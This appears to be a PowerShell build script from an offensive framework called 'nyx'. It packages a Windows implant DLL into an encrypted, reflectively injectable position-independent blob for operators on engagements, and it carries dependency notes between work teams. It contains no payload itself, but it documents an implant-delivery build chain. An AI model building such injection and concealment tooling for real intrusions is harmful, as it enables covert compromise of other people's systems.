# wrap_blob.ps1 — wrap the prod implant DLL into the reflective PIC blob.
#
# DEPENDENCY ON T1 (crates/nyx-loader, owned by T1):
#   This script invokes `cargo run -p nyx-loader --example wrap -- <input> <output>`.
#   As of 2026-07-21 the nyx-loader crate (crates/nyx-loader/Cargo.toml) exposes
#   ONLY a lib target — wrap_payload() is a library function (lib.rs:145) with no
#   bin or example entry point. This pipeline CANNOT add that example target
#   because crates/ is out of scope for T3 (T1 owns crates/nyx-loader/** per
#   spec §7 task table).
#
#   T1 MUST provide one of:
#     (a) crates/nyx-loader/examples/wrap.rs  — a small binary that reads
#         <input_dll>, calls nyx_loader::wrap_payload() with a LoaderConfig
#         (random key + nonce), and writes the blob to <output_blob>. The
#         operator is responsible for exfiltrating the key (it is baked into
#         the PIC stub at build time by generate_loader_stub()). OR
#     (b) a [[bin]] target in crates/nyx-loader/Cargo.toml that does the same,
#         invoked as `cargo run -p nyx-loader --release -- wrap <in> <out>`.
#
#   Until T1 lands (a) or (b), this step fails clearly with a cargo
#   "no example target named `wrap`" error — the failure is loud, not silent.
#   Integration note: if T1 names the target differently, update the
#   $WRAP_TARGET / $WRAP_MODE vars below.
#
# Input:  crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll
#         (produced by build_prod_dll.ps1)
# Output: crates/nyx-loader/target/release/nyx_loader_blob.bin
#         (stage_assets.ps1 copies this into staging/)
#
# The wrap step is release-blocking per spec §4 (loader probe gate consumes
# this blob). We do NOT verify the blob injects cleanly here — that is
# loader_probe_gate.ps1's job.
#
# Assumes CWD = repo root. PowerShell 5.1.
$ErrorActionPreference = 'Stop'

# ---- T1 integration knobs (update here if T1 names the target differently) ----
# WRAP_MODE = 'example' → cargo run -p nyx-loader --example wrap
# WRAP_MODE = 'bin'     → cargo run -p nyx-loader -- wrap
$WRAP_PKG    = 'nyx-loader'
$WRAP_TARGET = 'wrap'
$WRAP_MODE   = 'example'

# ---- Inputs / outputs ----
$inputDll  = 'crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll'
$outputDir = 'crates\nyx-loader\target\release'
$outputBlob = Join-Path $outputDir 'nyx_loader_blob.bin'

if (-not (Test-Path $inputDll)) {
    Write-Host "::error::prod DLL not found at $inputDll — run build_prod_dll.ps1 first."
    exit 1
}
if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }

Write-Host '== wrap_blob: invoke nyx-loader wrap target =='
# Build + run in one shot. --release so the chacha20poly1305 + PE parse path is
# the optimized build the operator will see on a real engagement.
$cargoArgs = @('run', '-p', $WRAP_PKG, '--release')
if ($WRAP_MODE -eq 'example') {
    $cargoArgs += @('--example', $WRAP_TARGET)
} elseif ($WRAP_MODE -eq 'bin') {
    # bin mode: no --example flag; the target name is the first positional after --.
    $cargoArgs += @('--', $WRAP_TARGET)
} else {
    Write-Host "::error::unknown WRAP_MODE='$WRAP_MODE' (expected 'example' or 'bin')"
    exit 1
}
$cargoArgs += @('--', $inputDll, $outputBlob)

Write-Host ("invoking: cargo " + ($cargoArgs -join ' '))
# PS 5.1 NATIVE-COMMAND STDERR TRAP — see build_prod_dll.ps1.
$prevEAP = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
    & cargo @cargoArgs 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "::error::nyx-loader wrap failed (exit $LASTEXITCODE)."
        Write-Host '::error::Likely cause: T1 has not yet provided the wrap example/bin target in crates/nyx-loader.'
        Write-Host '::error::See header of this script for the T1 dependency contract.'
        exit 1
    }
}
finally {
    $ErrorActionPreference = $prevEAP
}

if (-not (Test-Path $outputBlob)) {
    Write-Host "::error::wrap target ran but produced no output blob at $outputBlob"
    exit 1
}
$size = (Get-Item $outputBlob).Length
# Sanity: blob must be larger than the DLL (PIC stub + NYX2 header + nonce + tag
# = ~86 bytes overhead, ciphertext = plaintext len). A blob smaller than the
# input is a wrap_payload() bug.
$dllSize = (Get-Item $inputDll).Length
if ($size -lt $dllSize) {
    Write-Host "::error::blob ($size bytes) is smaller than input DLL ($dllSize bytes) — wrap_payload layout is wrong."
    exit 1
}
Write-Host ("== wrap_blob OK: {0} ({1} bytes; DLL was {2} bytes) ==" -f $outputBlob, $size, $dllSize)
